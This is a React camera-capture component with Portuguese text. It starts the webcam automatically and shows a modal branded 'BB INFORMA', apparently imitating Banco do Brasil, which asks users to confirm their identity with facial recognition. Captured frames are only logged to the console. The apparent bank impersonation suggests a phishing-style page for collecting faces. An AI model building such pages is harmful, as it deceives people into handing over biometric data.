import React, { useRef } from 'react';
import './CameraComponent.css'

const CameraComponent = () => {
    const videoRef = useRef(null);
    const canvasRef = useRef(null);
    const modalRef = useRef(null);

    const closeModal = () => {
      modalRef.current.style.display = 'none';
    }

    const startCamera = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            if (videoRef.current) {
                videoRef.current.srcObject = stream;
            }
        } catch (error) {
            handleCameraError(error);
        }
    };

    const handleCameraError = (error) => {
        if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
            alert('Nenhuma câmera encontrada neste dispositivo.');
        } else if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
            alert('Permissão para acessar a câmera foi negada.');
        } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
            alert('A câmera não está disponível ou já está em uso.');
        } else {
            alert(`Erro ao acessar a câmera: ${error.message}`);
        }
        console.error('Error accessing camera:', error);
    };

    const capturePhoto = () => {
        if (videoRef.current && canvasRef.current) {
            const video = videoRef.current;
            const canvas = canvasRef.current;
            const context = canvas.getContext('2d');

            // Define o tamanho do canvas para ser igual ao tamanho do vídeo
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Desenha o quadro atual do vídeo no canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Você pode fazer algo com a imagem capturada aqui, como enviar para o servidor

            // Exemplo de exibição da imagem capturada no console
            const imageData = canvas.toDataURL('image/jpeg');
            if(!imageData){
              alert('erro ao capturar foto')
            }
            console.log('Imagem capturada:', imageData);
        }
    };

    React.useEffect(() => {
        startCamera();
    }, []);

    return (
        <div className='camera-frame'>
          <div className='enquadramento'></div>
          <div className='modal' ref={modalRef}>
            <div className='sob-modal'>
              <i className="bi bi-camera" id='exclamation-icon'></i>
              <span className='title-alert'>BB INFORMA</span>
              <span className='subtitle-alert'>Confirme sua identidade com reconhecimento facial, habilite a permissão de câmera no seu navegador.</span>
              <span className='resgatar-btn' onClick={() => closeModal()}>ENTENDIDO</span>
            </div>
          </div>
            <video ref={videoRef} autoPlay playsInline muted style={{ maxWidth: '100%' }} />
            <div>
                <span onClick={capturePhoto} className="capture-button">Capturar Foto</span>
            </div>
            <canvas ref={canvasRef} style={{ display: 'none' }} />
        </div>
    );
};

export default CameraComponent;
